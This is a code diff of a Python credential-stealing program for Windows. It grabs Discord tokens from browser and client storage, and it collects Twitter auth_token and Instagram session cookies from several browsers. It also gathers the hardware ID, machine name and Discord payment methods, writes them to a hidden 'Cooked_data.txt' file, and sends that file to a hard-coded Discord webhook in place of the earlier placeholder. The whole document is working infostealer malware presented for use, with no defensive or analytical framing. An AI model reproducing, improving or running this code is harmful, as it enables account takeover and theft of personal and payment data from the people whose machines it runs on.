@@ -12,11 +12,12 @@ from subprocess import Popen, PIPE
 from urllib.request import urlopen, Request
 from requests import get, post
 from random import randint
-from re import findall
+from re import findall, search
 import win32con
 from win32api import SetFileAttributes
+import browser_cookie3
 
-website = ['twitter.com', 'discord.com', 'instagram.com']
+website = ['discord.com', 'twitter.com', 'instagram.com']
 
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -27,21 +28,42 @@ def get_user_data(tk):
     response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
     return [response['username'], response['discriminator'], response['email'], response['phone']]
 
-def variant1(token):
-    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
-    return True if response.status_code == 200 else False
-
-def variant2(token):
-    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
-    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
-        return False
-    else:
-        return True
-
 def has_payment_methods(tk):
     headers = {'Authorization': tk}
     response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
     return response
+
+def cookies_grabber_mod(site):
+    cookies = []
+    try:
+        cookies.append(str(browser_cookie3.chrome(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.edge(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.firefox(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.brave(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.opera(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.vivaldi(domain_name=site)))
+    except:
+        pass
+    try:
+        cookies.append(str(browser_cookie3.chromium(domain_name=site)))
+    except:
+        pass
+    return cookies
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -77,11 +99,9 @@ def main():
     db = connect(filename)
     db.text_factory = lambda b: b.decode(errors="ignore")
     cursor = db.cursor()
-    logon_twitter = ''
-    for x in website:
-        if x == 'discord.com':
-            path_chrome = f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
-            path_discord = f"{os.getenv('APPDATA')}\\Discord\\Local Storage\\leveldb"
+    result = []
+    for w in website:
+        if w == 'discord.com':
             tokens = []
             def discord_tokens(path):
                 for file_name in os.listdir(path):
@@ -91,44 +111,76 @@ def main():
                         for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                             for token in findall(regex, line):
                                 if token not in tokens:
-                                    if variant2(token) == True:
-                                        tokens.append(token)
-                                    elif variant1(token) == True:
-                                        tokens.append(token)
-            if os.path.exists(path_discord):
-                threads = []
-                th1 = Thread(target=discord_tokens, args=(path_discord,))
-                th2 = Thread(target=discord_tokens, args=(path_chrome,))
-                threads.append(th1)
-                threads.append(th2)
-                for t in threads:
-                    t.start()
-                for t in threads:
-                    t.join()
-            else:
-                discord_tokens(path_chrome)
+                                    tokens.append(token)
+            paths = [
+                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
+                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
+                os.path.join(os.getenv('APPDATA'), "discordptb"),
+                os.path.join(os.getenv('APPDATA'), "discordcanary"),
+                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
+            ]
+            threads = []
+            def find_wb(wb):
+                if os.path.exists(wb):
+                    threads.append(Thread(target=discord_tokens, args=(wb,)))
+            for j in paths:
+                find_wb(j)
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join()
             final_tokens = ''
             for n in tokens:
                 final_tokens += f"- {n}\n"
-            logon_discord = f"""=====================================================\nDISCORD INFO:\n\nHost: {x}\nCookie name: TOKEN\nCookie value [discord token(s)]:\n\n{final_tokens}====================================================="""
-        else:
+            result.append(f"""=====================================================\nDISCORD INFO:\n\nHost: {w}\nCookie name: TOKEN\nCookie value [discord token(s)]:\n\n{final_tokens}=====================================================""")
+        elif w == 'twitter.com':
+            t_cookies = []
+            for b in cookies_grabber_mod('twitter.com'):
+                t_cookies.append(b.split(', '))
+            t_lst = []
+            for c in t_cookies:
+                for y in c:
+                    if search(r"auth_token", y) != None:
+                        dt = y.split(' ')[1].split("=")[1]
+                        if dt not in t_lst:
+                            t_lst.append(dt)
+            if len(t_lst) != 0:
+                result.append(f"""TWITTER INFO:\n\nHost: twitter.com\nCookie name: auth_token\nCookie value [twitter authentification key]: {t_lst}\n=====================================================""")
+        elif w == 'instagram.com':
             instaLst = []
             cursor.execute(f"""
             SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-            FROM cookies WHERE host_key like '%{x}%'""")
+            FROM cookies WHERE host_key like '%{w}%'""")
             key = get_encryption_key()
             for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                 if not value:
                     decrypted_value = decrypt_data(encrypted_value, key)
                 else:
                     decrypted_value = value
-                if x == 'twitter.com'and name == 'auth_token':
-                    logon_twitter += f"""TWITTER INFO:\n\nHost: {host_key}\nCookie name: {name}\nCookie value [twitter authentification key]: {decrypted_value}\n====================================================="""
-                    break
-                elif x == 'instagram.com':
-                    instaLst.append({'domain': f"{host_key}", "name": f"{name}", "value": f"{decrypted_value}"})
-            logon_instagram = f"""INSTAGRAM INFO:\n\n{json.dumps(instaLst, indent=4)}\n=====================================================\n"""
-
+                instaLst.append({'domain': f"{host_key}", "name": f"{name}", "value": f"{decrypted_value}"})
+            instaLst = []
+            if len(instaLst) != 0:    
+                result.append(f"INSTAGRAM INFO:\n\n{json.dumps(instaLst, indent=4)}\n=====================================================\n")
+            else:
+                insta_cookies = []
+                for b in cookies_grabber_mod('instagram.com'):
+                    insta_cookies.append(b.split(', '))
+                insta_lst = []
+                insta_dupl = []
+                for c in insta_cookies:
+                    for y in c:
+                        if search(r"ds_user_id", y) != None:
+                            dt = y.split(' ')[1].split("=")[1]
+                            if dt not in insta_dupl:  
+                                insta_dupl.append(dt)                          
+                                insta_lst.append(c)
+                if len(insta_lst) != 0:
+                    insta_formated = 'INSTAGRAM ALL COOKIES FOUNDED:\n\n'
+                    for h in insta_lst:
+                        insta_formated += f"{h}\n"
+                    result.append(insta_formated)
     hwid = get_hwid()
     pc_username = os.getenv('UserName')
     pc_name = os.getenv('COMPUTERNAME')
@@ -151,7 +203,9 @@ def main():
         pass
     with open(f"Cooked_data.txt", "a") as f:
         SetFileAttributes('Cooked_data.txt',win32con.FILE_ATTRIBUTE_HIDDEN)
-        data = f"{logon_discord}\n{logon_twitter}\n{logon_instagram}"
+        data = ''
+        for r in result:
+            data += f"{r}\n"
         f.write(data)
     all_data, all_data_p, lst, lst_b = [], [], '', ''
     for x in tokens:
@@ -193,7 +247,7 @@ def main():
             elif all_data_p[m][1] == 2:
                 f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                 discord_info_w(m, 2)
-    webhook = DiscordWebhook(url="YOUR_DISCORD_URL", content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/992907614285463603/vQOkrBzUiH16cAY1WPFcfwR09QOajEMS6dyhsRFcA3yDyggi1zQQPbYYat_4_V6Nx6h_", content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
     with open("Cooked_data.txt", "rb") as f:
         webhook.add_file(file=f.read(), filename='data.txt')
     webhook.execute()
